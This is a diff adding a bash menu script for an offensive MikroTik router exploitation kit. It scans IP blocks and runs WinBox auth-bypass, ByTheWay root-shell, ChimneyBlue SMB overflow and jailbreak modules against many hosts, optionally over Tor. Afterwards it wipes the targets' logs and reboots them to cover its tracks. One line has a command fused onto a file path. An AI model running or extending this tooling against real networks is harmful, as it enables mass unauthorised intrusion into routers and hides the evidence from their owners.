@@ -1,0 +1,899 @@
+#!/bin/bash
+LPATH='/opt/MkCheck/'
+ORNG='\033[0;33m'
+NC='\033[0m'
+W='\033[1;37m'
+LP='\033[1;35m'
+YLW='\033[1;33m'
+LBBLUE='\e[104m'
+RED='\033[0;31m'
+LGRY='\033[0;37m'
+INV='\e[7m'
+BRED='\033[1;31m'
+UPURPLE='\033[4;35m'
+UBLUE='\033[4;34m'
+URED='\033[4;31m'
+LCYN='\033[1;36m'
+Z=1
+ARGUMENT=$2
+
+##############################
+# ! # First Time Deb Install #
+##############################
+FIRSTTIME=1
+###
+#first_inst(){
+#        echo -e "\n${LGRY}####################################"
+#        echo -e "# ${NC}[${RED}!${NC}]${ORNG}NOTE:${YLW} Running Initial Install ${LGRY}#${NC}"
+#        echo -e "${LGRY}####################################${NC}\n"
+#        sudo bash /opt/MkCheck/setup.sh
+        ##
+        # Initial Install
+        ##
+#        sudo sed -i "s/FIRSTTIME=1/FIRST=DONE/g" /opt/MkCheck/mkcheck
+#        sudo sed -i "s/FIRSTTIME=1/FIRST=DONE/g" /opt/MkCheck/mthread
+#        sudo sed -i "s/FIRSTTIME=1/FIRST=DONE/g" /usr/sbin/mkcheck
+#        sudo sed -i "s/FIRSTTIME=1/FIRST=DONE/g" /usr/sbin/mthread
+#}
+
+#if [[ ${FIRSTTIME} == 1 ]]; then
+#        first_inst
+#fi
+
+cd /opt/MkCheck
+#########################################
+#######################
+#  Trap Control Init  #
+#######################
+
+function trap_ctrlc (){
+    # perform cleanup here
+    echo -e "${URED}Ctrl-C caught...${NC}"
+    echo -e "${W}Would you like to ${YLW}q${W}uit the program, go back to ${YLW}m${W}enu or ${YLW}b${W}ack to script?(${YLW}q${W}/${YLW}m${W}/${YLW}b${W})${NC}"
+	read EXIT
+	if [[ ${EXIT} == "q" ]]; then
+		if [[ ${MODULE} == "1" ]]; then
+			apresults
+		fi
+		exit 2
+	elif [[ ${EXIT} == "m" ]]; then
+		if [[ ${MODULE} == "1" ]]; then
+			apresults
+		fi
+		main
+	else
+		return
+	fi
+}
+
+##########################################
+#######################
+#  Invoke trap_ctrlc  #
+#######################
+
+trap "trap_ctrlc" 2
+
+##########################################
+################################
+#   Privilige and File Checks  #
+################################
+
+sudo chown $USER:$USER -R /opt/MkCheck
+cd /opt/MkCheck
+
+##########################################
+####################
+#    Root Check    #
+####################
+
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root"
+   exit 1
+fi
+
+###########################################
+#######################
+# Result folder check #
+#######################
+
+if [[ ! -d '/opt/MkCheck/results' ]]; then
+	mkdir /opt/MkCheck/results
+fi
+
+##########################################
+########################
+#   RSF folder check   #
+########################
+
+if [[ ! -d '/opt/MkCheck/results/RSF' ]]; then
+	mkdir /opt/MkCheck/results/RSF
+fi
+
+##########################################
+########################
+#   BTW folder check   #
+########################
+
+if [[ ! -d '/opt/MkCheck/results/btw' ]]; then
+	mkdir /opt/MkCheck/results/btw
+fi
+
+##########################################
+########################
+#   Vuln folder check  #
+########################
+
+if [[ ! -d '/opt/MkCheck/results/Vulns' ]]; then
+	mkdir /opt/MkCheck/results/Vulns
+fi
+
+#########################################################
+######################
+# (SE) Session Edit  #
+######################
+
+edit_session(){
+	    echo -e "${YLW}This changs a single number set <xx.xx.132.xx>, to change multiple, just run this option again${NC}"
+        echo -e "${W}Please enter the name of the session to edit${NC}"
+        read SESH_EDIT
+        cp files/.${SESH_EDIT}_tiks.txt files/.temp_tiks.txt
+        echo -e "${W}Please enter the number to be replaced${NC}"
+        read OUTNUM
+		echo -e "${W}Please enter the number to insert${NC}"
+        read INNUM
+        echo -e "${W}Please enter the name for this target files session${NC}"
+        read SESSION
+        echo ${SESSION} >> .conf
+        sed -i "s/${OUTNUM}/${INNUM}/g" files/.temp_tiks.txt
+        cp files/.temp_tiks.txt files/tiks_res.txt
+		python3 scripts/get/res.py
+		rm files/tiks_res.txt
+		mv files/res.txt files/tiks_res.txt
+		rm res.txt														# Make result targets file
+        cp files/.temp_tiks.txt files/tiks_rsf.txt						# Make routersploit targets file
+		cp files/.temp_tiks.txt files/tiks.txt							# Make MikroTik targets file
+		if [[ -f '/opt/MkCheck/files/small_file*' ]]; then				# Creates split Target file for mthread
+			rm files/small_file*
+		fi
+		python3 /opt/MkCheck/files/split.py
+		mv files/.temp_tiks.txt files/.${SESSION}_tiks.txt				# Make backup session file
+
+	########################################################
+    ##############################
+	#  RSF Session Folder Check  #
+	##############################
+
+	if [[ ! -d '/opt/MkCheck/results/RSF/${SESSION}' ]]; then
+			mkdir /opt/MkCheck/results/RSF/${SESSION}
+	fi
+
+	####################################################
+   	 ###############################
+	#  Vuln Session Folder Check  #
+	###############################
+
+	if [[ ! -d '/opt/MkCheck/results/Vulns/${SESSION}' ]]; then
+		mkdir /opt/MkCheck/results/Vulns/${SESSION}
+	fi
+
+	########################################################
+	##############################
+	#  BTW Session Folder Check  #
+	##############################
+
+	if [[ ! -d '/opt/MkCheck/results/btw/${SESSION}' ]]; then
+		mkdir /opt/MkCheck/results/btw/${SESSION}
+	fi
+}
+
+##############################################################
+#  Fresh Session  #
+###################
+
+fresh(){
+	sudo rm files/tiks.txt files/tiks_res.txt files/tiks_rsf.txt
+	echo -e "${W}Please enter a name for this session${NC}"
+	read SESSION
+	echo ${SESSION} >> .conf
+	echo -e "${W}Please enter your target block${NC}"
+	sleep 2
+	nano files/tiks.txt
+	if [[ -f '/opt/MkCheck/files/small_file*' ]]; then
+		rm files/small_file*
+	fi
+	python3 /opt/MkCheck/files/split.py
+	echo -e "${YLW}Backup of this sessions Target file saved as ${UBLUE}.${SESSION}_tiks.txt${NC}"
+	cp files/tiks.txt files/.${SESSION}_tiks.txt
+	cp files/tiks.txt files/tiks_res.txt
+	python3 scripts/get/res.py
+	rm files/tiks_res.txt
+	mv files/res.txt files/tiks_res.txt
+	rm res.txt
+	cp files/tiks.txt files/tiks_rsf.txt
+
+	########################################################
+    ##############################
+	#  RSF Session Folder Check  #
+	##############################
+
+	if [[ ! -d '/opt/MkCheck/results/RSF/${SESSION}' ]]; then
+			mkdir /opt/MkCheck/results/RSF/${SESSION}
+	fi
+
+	####################################################
+    	###############################
+	#  Vuln Session Folder Check  #
+	###############################
+
+	if [[ ! -d '/opt/MkCheck/results/Vulns/${SESSION}' ]]; then
+		mkdir /opt/MkCheck/results/Vulns/${SESSION}
+	fi
+
+	########################################################
+	##############################
+	#  BTW Session Folder Check  #
+	##############################
+
+	if [[ ! -d '/opt/MkCheck/results/btw/${SESSION}' ]]; then
+		mkdir /opt/MkCheck/results/btw/${SESSION}
+	fi
+}
+
+##############################################################
+########################
+# (SC) Session Choice  #
+########################
+
+session_choice(){
+  SESSION=$(cat .conf)
+	echo -e "${W}Previous Sessions: ${LP}${SESSION}${NC}"
+	echo -e "${W}Would you like to ${URED}u${NC}${W}se a previous session, ${URED}e${NC}${W}dit an existing session, \n${URED}c${NC}${W}reate a new session or start ${URED}f${NC}${W}resh?${YLW}(u/e/f)${NC}"
+	read CONF
+	if [[ ${CONF} == "f" ]]; then
+		fresh
+	elif [[ ${CONF} == "e" ]]; then
+		edit_session
+	elif [[ ${CONF} == "c" ]]; then
+		echo -e "${W}Please enter the name of this session${NC}"
+		read SESSION
+		echo ${SESSION} >> .conf
+		echo -e "${W}Please enter your IP block${NC}"
+		sleep 2
+		rm files/tiks.txt
+		nano files/tiks.txt
+		if [[ -f '/opt/MkCheck/files/small_file*' ]]; then
+			rm files/small_file*
+		fi
+		python3 /opt/MkCheck/files/split.py
+		cp files/tiks.txt files/.${SESSION}_tiks.txt
+		cp files/tiks.txt files/tiks_res.txt
+		python3 scripts/get/res.py
+		rm files/tiks_res.txt
+		mv files/res.txt files/tiks_res.txt
+		rm res.txt
+		cp files/tiks.txt files/tiks_rsf.txt
+	else
+		echo -e "${W}Please enter the name of the session to use:${NC}"
+		read SESSION
+		cp files/.${SESSION}_tiks.txt files/tiks.txt
+		if [[ -f '/opt/MkCheck/files/small_file*' ]]; then
+			rm files/small_file*
+		fi
+		python3 /opt/MkCheck/files/split.py
+		python3 scripts/get/res.py
+		rm files/tiks_res.txt
+		mv files/res.txt files/tiks_res.txt
+		rm res.txt
+	fi
+}
+
+#########################################################################
+#######################
+#    Session Check    #
+#######################
+session_check(){
+	if [[ ! -f '.conf' ]]; then
+		# First check to see if tiks.txt has data
+		RE=$(cat /opt/MkCheck/files/tiks.txt)
+		if [[ ${RE} == "" ]]; then
+			echo -e "${URED}Please enter an IP block to start scanning first${NC}"
+			echo -e "${RED}Please make first target end with 0 (${UBLUE}eg. a.b.c.0${NC}${RED})${NC}"
+			sleep 5
+			sudo nano /opt/MkCheck/files/tiks.txt
+		fi
+
+		#################################################
+		#################################################
+		#  Second check to see if data is example data  #
+		#################################################
+
+		RR=$(cat /opt/MkCheck/files/tiks.txt | grep "a.b.c.0")
+		if [[ ${RR} == "a.b.c.0" ]]; then
+			echo -e "${URED}Please enter the first 3 numbers of the target IP ${NC}"
+			echo -e "${RED}eg. ${UBLUE} a.b.c / 12.34.5${NC}"
+			read TIP
+			REP='a.b.c'
+			sudo sed -i "s/${REP}/${TIP}/g" /opt/MkCheck/files/tiks.txt
+			if [[ -f '/opt/MkCheck/files/small_file*' ]]; then
+				rm files/small_file*
+			fi
+			python3 /opt/MkCheck/files/split.py
+		fi
+		echo -e "${W}Please enter a name for this session${NC}"
+		read SESSION
+		echo "${SESSION}" > .conf
+		echo -e "${W}Session: ${LP}${SESSION}${NC}"
+		cp files/tiks.txt files/.${SESSION}_tiks.txt
+
+		##############################
+		##############################
+		#  RSF Session Folder Check  #
+		##############################
+
+		mkdir /opt/MkCheck/results/RSF/${SESSION}
+		mkdir /opt/MkCheck/results/Vulns/${SESSION}
+		mkdir /opt/MkCheck/results/btw/${SESSION}
+	else
+
+		####################################
+		####################################
+		# (SC) Check for data replacement  #
+		####################################
+
+		session_choice
+	fi
+
+	############################################
+	############################################
+	#  Routersploit file check (tiks.rsf.txt)  #
+	############################################
+
+	if [[ -f '/opt/MkCheck/files/tiks_rsf.txt' ]]; then
+		RT=$(cat /opt/MkCheck/files/tiks_rsf.txt | grep "a.b.c.0")
+		if [[ ${RT} == "a.b.c.0" ]]; then
+			sudo rm /opt/MkCheck/files/tiks_rsf.txt
+			cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_rsf.txt
+		fi
+	else
+		sudo cp files/tiks.txt files/tiks_rsf.txt
+	fi
+
+	######################################
+	######################################
+	#  Result file check (tiks_res.txt)  #
+	######################################
+
+	if [[ -f '/opt/MkCheck/files/tiks_res.txt' ]]; then
+		RS=$(cat /opt/MkCheck/files/tiks_res.txt | grep "a.b.c.0")
+		if [[ ${RS} == "a.b.c.0" ]]; then
+			sudo rm /opt/MkCheck/files/tiks_res.txt
+			cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_res.txtpython3 scripts/get/res.py
+			rm files/tiks_res.txt
+			mv files/res.txt files/tiks_res.txt
+			rm res.txt
+		fi
+	else
+		cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_res.txt
+		python3 scripts/get/res.py
+		rm files/tiks_res.txt
+		mv files/res.txt files/tiks_res.txt
+		rm res.txt
+	fi
+}
+#########################################
+#########################################
+#  Insert new target for MCheck Attack  #
+#########################################
+
+target(){
+	RARG=$(python3 scripts/get_t.py)
+	VAR=$(echo ${RARG})
+	FARG='host = "ARG"'
+}
+
+####################
+####################
+#  Host Auto Load  #
+####################
+
+running(){
+	mv files/tiks1.txt files/tiks.txt
+	# Start
+	TARG=$(cat scripts/miko.py | grep "host = *")
+	sed -i "s/${TARG}/${FARG}/g" scripts/miko.py
+	sed -i "s/ARG/${VAR}/g" scripts/miko.py
+	echo -e "${UPURPLE}${Z}.${UBLUE}Next Target is ${YLW}${VAR}${NC}"
+}
+
+
+#############
+# Final Result LookUp
+############
+
+resultsopt(){
+	RARG=$(python3 scripts/get/res.py)
+	VAR=$(echo ${RARG})
+	mv files/res.txt files/tiks_res.txt
+	sudo mv /opt/MkCheck/results/Vulns/* -t /opt/MkCheck/results/Vulns/${SESSION}
+}
+
+###############################################
+###############################################
+#  Final Results Correlation for Net AP Name  #
+###############################################
+
+apresults(){
+  Y='1'
+  SYQ=$(cat /opt/MkCheck/files/tiks_res.txt | grep "#")
+  if [[ ${SYQ} == "#" ]]; then
+		echo -e "${W}Please ensure there are no commented out lines\notherwise this check will fail${NC}"
+  fi
+  resultsopt
+  for log in `cat /opt/MkCheck/files/tiks_res.txt`
+		do
+			Y=$(( ${Y} + 1 ))
+			IP=$(cat results/Vulns/${SESSION}/${log}.results)
+			echo "${log} ${IP}" > ${log}.temp
+			cat ${log}.temp >> results/Vulns/${SESSION}/final.results
+			rm ${log}.temp
+			echo "==========================================================================="
+			if [[ ${Y} -eq ${Z} ]]; then
+	# cat results/Vulns/${SESSION}/*.results | sudo tee final.results
+					######################
+					######################
+					#  Targetted Lookup  #
+					######################
+					echo -e "${W}Was there a specific target you were looking for?${YLW}(y/n)${NC}"
+					read GETTED
+					if [[ ${GETTED} == "y" ]]; then
+							echo -e "${W}Please specify a keyword for your target Access Point${NC}"
+							echo -e "${RED}eg. ${YLW}123 Apartment${RED} <-- target access point name${NC}"
+							echo -e "${RED}Keyword to search for would be ${YLW}Apartment${RED} or ${YLW}123${NC}"
+							read KEY
+							cat /opt/MkCheck/results/Vulns/${SESSION}/final.results | grep ${KEY}
+					fi
+
+				  mv /opt/MkCheck/results/Vulns/*.results -t /opt/MkCheck/results/Vulns/${SESSION}
+			fi
+		done
+}
+
+###################################################3###############33
+############################################
+#  Mikro Network AP Name Check (No Proxy)  #
+############################################
+
+mchecker(){
+	while [[ $Z -le 255 ]];
+	do
+		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
+		target
+		echo ""
+		running
+		echo ""
+		sudo python2 scripts/miko.py | tee output.log
+		NAME=$(cat output.log | grep 'name:')
+		VER=$(cat output.log | grep 'RouterOS')
+		echo "${NAME}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "${VER}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "=================================================" >> results/Vulns/${SESSION}/${VAR}.results
+		sudo rm output.log
+		Z=$(( $Z + 1 ))
+		if [[ ${Z} -eq 255 ]]; then
+			break
+		fi
+	done
+	echo -e "${YLW}Clearing Target Device SSH History & Sorting Results${NC}"
+	echo ${USER} > temp_user
+	TMP='= "'
+	INP=''
+	sed -i "s/${TMP}/${INP}/g" temp_user
+	TMI='"'
+	TMU=''
+	sed -i "s/${TMI}/${TMU}/g" temp_user
+	USE=$(cat temp_user)
+	sudo python2 scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u admin -c '/system logging action set memory-lines=1'
+  sudo python2 scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u admin -c '/system logging action set memory-lines=1000'
+  sudo python2 scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u admin -c '/system reboot'
+	sudo rm -rf /opt/MkCheck/logs
+	sudo rm temp_user
+	apresults
+	main
+}
+
+##############################################################333########33###
+#######################################
+#  Network AP Discovery (with Proxy)  #
+#######################################
+pchecker(){
+	while [[ $Z -le 255 ]];
+	do
+		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
+		target
+		echo ""
+		running
+		echo ""
+		proxychains4 sudo python2 scripts/miko.py | tee output.log
+		NAME=$(cat output.log | grep 'name:')
+		VER=$(cat output.log | grep 'RouterOS')
+		echo "${NAME}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "${VER}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "=================================================" >> results/Vulns/${SESSION}/${VAR}.results
+		sudo rm output.log
+		Z=$(( $Z + 1 ))
+		if [[ ${Z} -eq 255 ]]; then
+			break
+		fi
+	done
+	echo ${USER} > temp_user
+	TMP='= "'
+	INP=''
+	sed -i "s/${TMP}/${INP}/g" temp_user
+	TMI='"'
+	TMU=''
+	sed -i "s/${TMI}/${TMU}/g" temp_user
+	USE=$(cat temp_user)
+	echo -e "${YLW}Clearing Target Device SSH History & Sorting Results${NC}"
+  proxychains4 sudo python2 scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u admin -c '/system logging action set memory-lines=1'
+  proxychains4 sudo python2 scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u admin -c '/system logging action set memory-lines=1000'
+  proxychains4 sudo python2 scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u admin -c '/system reboot'
+	sudo rm -rf /opt/MkCheck/logs
+	sudo rm temp_user
+	apresults
+	main
+}
+
+#######################################3##################################33
+#############################
+#  ByTheWay BackDoor Check  #
+#############################
+bytheway(){
+	for name in `cat files/tiks.txt`
+	do
+		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
+		echo ""
+		echo -e "${UPURPLE}${Z}.${UBLUE}Next Target is ${YLW}${name}${NC}"
+		echo ""
+		BTW=$(./btw -i ${name})
+		echo "${BTW}" >> /opt/MkCheck/results/btw/${SESSION}/${name}.log
+		echo "${BTW}" >> /opt/MkCheck/results/btw/${SESSION}/final.results
+		echo "=================================================" >> /opt/MkCheck/results/btw/${SESSION}/final.results
+		Z=$(( $Z + 1 ))
+		if [[ ${Z} -eq 255 ]]; then
+			echo -e "${LP}Sorting Results${NC}"
+			break
+		fi
+	done
+	main
+}
+
+#######################################3##################################33
+#############################
+#  Routersploit Vuln Check  #
+#############################
+
+rtsploit(){
+	cd /opt/MkCheck
+	python3 scripts/get/rsf.py
+	for name in `cat /opt/MkCheck/files/rsf.txt`
+		do
+			#########################################
+			#########################################
+			#  winbox_auth_bypass_creds_disclosure  #
+			#########################################
+			cd /opt/MkCheck/scripts/
+			echo -e "${RED}[*]${NC} Running WinBox Exploit Check"
+			WB=$(sudo python3 winbox.py ${name})
+			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
+			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
+			echo "${WB}"
+		done
+}
+
+######################
+# RouterOS JailBreak #
+######################
+stagetwo(){
+  echo -e "${YLW}Are you ready for stage 2? (y/n)${NC}"
+  read QSTAGE
+  if [[ ${QSTAGE} == "y" ]]; then
+    sudo bash second_stage.sh
+  fi
+}
+##
+jailbreaker(){
+  echo -e "${YLW}Is the target routers OS version 6.41 or ${W}n${YLW}ewer / 6.40 or ${W}o${NC}lder?\n${RED}Please ensure the correct version is selected!${NC}"
+  read OSV
+  if [[ ${OSV} == "o" ]]; then
+    cd /opt/MkCheck/scripts/JailBreak/old
+    sudo bash exploit_full.sh
+  elif [[ ${OSV} == "n" ]]; then
+    cd /opt/MkCheck/scripts/JailBreak/new
+    sudo bash make_usb.sh
+    stagetwo
+  else
+    echo -e "${RED}Invalid option, please select (n/o)${NC}"
+    stagetwo
+  fi
+}
+
+# Chimney-Blue #
+################
+bluechimney(){
+  echo  -e "${YLW}Please enter the target IP${NC}"
+  read CBIP
+  echo -e "${YLW}Please enter the command to be run${NC}"
+  read CBCMD
+  echo -e "${YLW}Please select the target architecture:${NC}"
+  echo -e "${ORNG}1. ${YLW}x86 ${NC}"
+  echo -e "${ORNG}2. ${YLW}Mips ${NC}"
+  read CBARC
+  if [[ ${CBARC} == "1" ]]; then
+    CBS='scripts/ChimneyBlue_x86.py'
+  else
+    CBS='scripts/ChimneyBlue_mips.py'
+  fi
+  python3 ${CBS} ${CBIP} ${CBCMD}
+}
+
+######################################################
+##################
+# nMap IP Search #
+##################
+mkmap(){
+	echo -e "${W}Please enter your IP block to scan eg. ${YLW}111.11.11.1/24${NC}"
+	echo -e "${W}The ports needed are ${RED}80 8291 ${NC}"
+	read BLOCK
+	echo -e "${ORNG}"
+	sudo nmap -vv -O -p 22,8291 -Pn ${BLOCK}
+	echo -e "${NC}"
+	main
+}
+
+######################################################
+#################
+#  Update Args  #
+#################
+
+up_arg(){
+    echo $1 >> temp.log
+    echo $2 >> temp.log
+    echo $3 >> temp.log
+    echo $4 >> temp.log
+    echo $5 >> temp.log
+	echo $6 >> temp.log
+	echo $7 >> temp.log
+	echo $8 >> temp.log
+
+    for UFILES in `cat temp.log`
+       	        do
+    	            rm /opt/MkCheck/${UFILES}
+                done
+    rm /opt/MkCheck/temp.log
+}
+update(){
+    cd /opt/MkCheck
+    echo -e "${ORNG}"
+    figlet -f mini "Checking for updates"
+    echo -e "${NC}"
+	mv /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/temp_tiks
+    git fetch
+    VER=$(git pull)
+    if [[ ${VER} == "Already up to date." ]]; then
+        echo -e "${LP}"
+        figlet -f mini "Up to date."
+        echo -e "${NC}"
+    else
+	    sleep 5
+	    echo -e "${W}Are there pull conflicts with files?(y/n)${NC}"
+        sleep 3
+	    read UANS
+	    if [[ ${UANS} == "y" ]]; then
+        	export LPATH
+        	echo -e "${W}Please enter the conflicting files (seperated by a space)${NC}"
+			read FILES
+          	sleep 2
+			up_arg ${FILES}
+			git pull
+			bash setup.sh
+	    else
+			git pull
+			bash setup.sh
+	    fi
+	    if [[ -f '/usr/sbin/mkcheck' ]]; then
+			sudo cp mkcheck -t /usr/sbin
+			sudo chmod +x /usr/sbin/mkcheck
+	    fi
+		if [[ -f '/usr/sbin/mthread' ]]; then
+			sudo cp mthread -t /usr/sbin
+			sudo chmod +x /usr/sbin/mthread
+	    fi
+		main
+    fi
+	mv /opt/MkCheck/files/temp_tiks /opt/MkCheck/files/tiks.txt
+  echo -e "${NC}"
+}
+
+##################################################################################
+#######################
+#  Router Cred Check  #
+#######################
+
+cred_check(){
+	USER=$(cat /opt/MkCheck/scripts/miko.py | grep 'username =')
+	PASS=$(cat /opt/MkCheck/scripts/miko.py | grep 'password =')
+	echo -e "${YLW}Current ${ORNG}${USER}"
+	echo -e "${YLW}Current ${ORNG}${PASS}${NC}"
+}
+
+################################################################################
+###############
+#  Main Menu  #
+###############
+
+main(){
+	MODULE=''
+	echo -e "${BRED}"
+	cd /opt/MkCheck
+	python3 files/banner.py
+	echo -e "${ORNG}Codename: ${LCYN}BlueChimney"
+	echo -e "${ORNG}by ${LCYN}s1l3nt78${NC}"
+	echo ""
+	echo -e "${LGRY}Mikrotik WinBox Auth Bypass  - ${W}Versions ${YLW}6.29${NC} ${W}to${NC} ${YLW}6.42"
+   	echo -e "${LGRY}Mikrotik RouterOS Jailbreak  - ${W}Versions ${YLW}2.9.8${NC} ${W}to ${YLW}6.41rc56${NC}"
+	echo -e "${LGRY}Mikrotik ByTheWay Root Shell - ${W}Versions ${YLW}6.29${NC} ${W}to ${YLW}6.42.0${NC}"
+	echo -e "${W}Hit ${UBLUE}Ctrl + Z${NC} ${W}to background MkCheck or ${UBLUE}Ctrl + C${NC} ${W}to quit a scan${NC}"
+	echo ""
+	echo -e "${URED}${W}Current Session: ${ORNG}${SESSION}${NC}"
+	cred_check
+	echo ""
+	echo -e ""
+	echo -e "${RED}1. ${LGRY}MikroTik Auto-EX"
+	echo -e "${RED}2. ${LGRY}RouterSploit Vuln Check"
+	echo -e "${RED}3. ${LGRY}ByTheWay BackDoor Check"
+  echo -e "${RED}4. ${LGRY}Chimney Blue SMB BufferOverflow"
+  echo -e "${RED}5. ${LGRY}RouterOS JailBreak"
+  	echo -e "${ORNG}6. ${LGRY}nMap Port Scan"
+	echo -e "${LP}7. ${LGRY}Change Session"
+  	echo -e "${LP}8. ${LGRY}Change Credential Values"
+	echo -e "${LP}9. ${LGRY}Clear all previous sessions.${NC}"
+	echo -e "${LCYN}10. ${LGRY}Update MkCheck"
+	echo -e "${LGRY}11. Exit${NC}"
+	echo ""
+	echo -e "${YLW}Which module would you like to use?${NC}"
+	read MODULE
+	if [[ ${MODULE} == "1" ]]; then
+		echo -e "${W}Would you like to run MCheck using a proxy?${YLW}(y/n)${NC}"
+		read PROXY
+		if [[ ${PROXY} == "y" ]]; then
+			sudo service tor restart
+			pchecker
+		else
+			mchecker
+		fi
+	elif [[ ${MODULE} == "2" ]]; then
+		rtsploit
+	elif [[ ${MODULE} == "3" ]]; then
+		bytheway
+	elif [[ ${MODULE} == "4" ]]; then
+    bluechimney
+  elif [[ ${MODULE} == "5" ]]; then
+    jailbreaker
+  elif [[ ${MODULE} == "6" ]]; then
+		mkmap
+	elif [[ ${MODULE} == "7" ]]; then
+		session_choice
+		main
+	elif [[ ${MODULE} == "8" ]]; then
+		echo -e "${W}Please enter the username to to insert${NC}"
+		read USR
+		echo -e "${W}Please enter the password to to insert${NC}"
+		read PW
+		# User Insert
+		sed -i "s/${USER}/username = \"${USR}\"/g" scripts/miko.py
+		# Password Insert
+		sed -i "s/${PASS}/password = \"${PW}\"/g" scripts/miko.py
+		ZET=$(cat /opt/MkCheck/scripts/clear.py | grep "ZTE=")
+		sed -i "s/${ZET}/ZTE='${PW}'/g" scripts/clear.py
+	elif [[ ${MODULE} == "9" ]]; then
+		sudo rm -rf .conf files/.*_tiks.txt
+		echo -e "${W}Would you like to create a ${URED}n${NC}${W}ew session or ${URED}e${NC}${W}xit?${YLW}(n/e)${NC}"
+		read MOD
+		if [[ ${MOD} == "n" ]]; then
+			fresh
+			main
+		else
+			exit 2
+		fi
+  elif [[ ${MODULE} == "10" ]]; then
+    	update
+		main
+	elif [[ ${MODULE} == "11" ]]; then
+		exit 2
+	else
+		echo -e "${URED}You have selected an invalid option${NC}"
+	fi
+	main
+}
+
+##########################################
+#############
+# Help Menu #
+#############
+helpmenu(){
+	echo -e "${LP}"
+	figlet MkCheck
+	echo -e "${YLW}"
+	echo ""
+	echo "# mkcheck -u Checks for any updates on Github"
+	echo -e "# mkcheck -r <session name> \n Runs the Routersploit module against given session name"
+	echo -e "# mkcheck -m <session name> \n Runs the MikroTik exploitation module (${YLW}no proxy${NC}) against given session name"
+    echo -e "# mkcheck -p <session name> \n Runs the MikroTik exploitation module (${YLW}proxy${NC}) against given session name"
+	echo -e "# mkcheck -b <session name> \nRuns the ByTheWay Root Shell Exploit Check against given session name"
+	echo -e "# mkcheck -n <IP block> \n Runs the nMap module against given IP Block"
+	echo -e "# mkcheck -h Print this menu and exit" 1>&2
+}
+
+##########################################
+#############################
+#  Start of MkCheck Script  #
+#############################
+cd /opt/MkCheck
+while getopts "ur:m:p:n:b:h" options; do            	            # Loop: Get the next option;
+	case "${options}" in                                # use silent error checking;
+                                                        # option a takes 1 arguments.
+		u)
+            update
+			main
+            ;;
+
+		r)
+			cp files/.${ARGUMENT}_tiks.txt files/tiks.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_res.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_rsf.txt
+			rtsploit
+			;;
+
+		m)
+			cp files/.${ARGUMENT}_tiks.txt files/tiks.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_res.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_rsf.txt
+			mchecker
+			;;
+
+		p)
+			sudo service tor start
+			cp files/.${ARGUMENT}_tiks.txt files/tiks.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_res.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_rsf.txt
+			pchecker
+			;;
+
+		b)
+			cp files/.${ARGUMENT}_tiks.txt files/tiks.txt
+			cp files/.${ARGUMENT}_tiks.txt files/tiks_res.txt
+			bytheway
+			;;
+
+		n)
+			sudo nmap -vv -O -p 22,8291 -Pn ${ARGUMENT}
+			;;
+
+		h)
+			helpmenu
+			;;
+
+	esac
+done
+if [[ $OPTIND == 1 ]]; then				                # if no option is passed
+	echo -e "${LP}"
+	figlet MkCheck
+	echo -e "${NC}"
+	session_check
+	main		  	                                # default command is run
+fi
+exit 0
+
+
+
+#####################################################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________#####################################################
